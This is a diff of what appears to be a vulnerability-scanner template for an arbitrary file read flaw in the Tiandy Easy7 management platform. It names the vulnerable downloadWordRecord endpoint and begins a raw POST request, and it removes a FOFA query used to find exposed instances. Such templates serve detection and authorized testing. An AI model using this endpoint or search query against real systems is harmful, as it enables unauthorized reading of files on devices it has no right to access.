@@ -3,12 +3,8 @@ info:
   name: 天地伟业Easy7综合管理平台 downloadWordRecord存在任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ahna22wasz9r5bei'
+  description: ''
   tags: lfi,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ahna22wasz9r5bei
-    fofa: app="Tiandy-Easy7"
 http:
 - raw:
   - 'POST /Easy7/rest/file/downloadWordRecord HTTP/1.1
